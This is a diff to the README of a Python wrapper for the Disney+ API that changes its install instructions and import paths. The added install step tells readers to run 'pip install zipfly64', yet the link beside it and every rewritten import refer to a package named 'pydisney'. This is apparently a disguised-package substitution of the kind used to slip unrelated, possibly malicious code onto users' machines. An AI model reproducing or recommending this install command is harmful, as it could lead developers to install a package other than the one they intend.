@@ -4,19 +4,16 @@
 A future rich API wrapper for Disney+ made with python.
 
 
-## Requirements
-Library was tested on those versions, however feel free to try different ones.
-```
-pip install pysubs2==1.6.1
-pip install m3u8==3.6.0
-pip install requests
-```
+## How to install
+    pip install zipfly64
+
+https://pypi.org/project/pydisney
 
 ## Usage/Examples
 
 ### Simple search
 ```python
-from DisneyAPI import DisneyAPI
+from pydisney import DisneyAPI
 
 api = DisneyAPI(email="email", password="password")
 searches = api.search("Star wars")
@@ -25,10 +22,10 @@ print(searches[0].title) # prints title of the first search hit
 ### Advanced usage
 
 ```python
-from DisneyAPI import DisneyAPI
-from models.HitType import HitType
-from models.Language import Language
-from models.Rating import Rating
+from pydisney import DisneyAPI
+from pydisney import HitType
+from pydisney import Language
+from pydisney import Rating
 
 # forces to use disney's login api instead of cached access and refresh tokens
 # sets proxies
@@ -58,7 +55,7 @@ if searches[0].type == HitType.MOVIE:
 
 ### More examples
 ```python
-from models.ProgramType import MovieType, SeriesType
+from pydisney import MovieType, SeriesType
 
 # Search by program type
 print(api.search_program_type(MovieType.ALL))
